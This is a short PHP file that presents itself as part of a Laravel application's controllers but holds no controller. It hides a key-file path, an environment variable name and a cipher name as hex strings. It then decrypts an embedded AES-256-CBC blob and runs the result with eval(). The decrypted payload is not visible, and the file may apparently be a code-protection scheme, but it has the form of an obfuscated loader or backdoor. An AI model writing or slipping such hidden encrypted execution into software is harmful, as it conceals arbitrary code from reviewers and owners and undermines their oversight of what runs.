<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('u0odY/k5NzspsLFT+MJ/rA==');

$c=base64_decode(

'7b7wRlntCdLJCeN1Aqne3yrlRh6zzqsZ8lLy3ZXyEPDRrF3UMK9wSaSafzuoDZXpAq3zqMoN6/kL' .
'YrdMzhtfBi1y+8gM057zcBN/tl5z/w9A0hlMdQEhdGWaLBxMRtE99RhcbWnXXUAmK31CXUFUE6mj' .
'25rXaktyX3HXRSpXHgDF9D9mIFYNO7PVdmeTv7ZSEBpHeHkRrmn1TD54LlszmDyasL2M67RDXKrX' .
'BPu9E16HomyN3cWoCRZAleaGtgwl'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

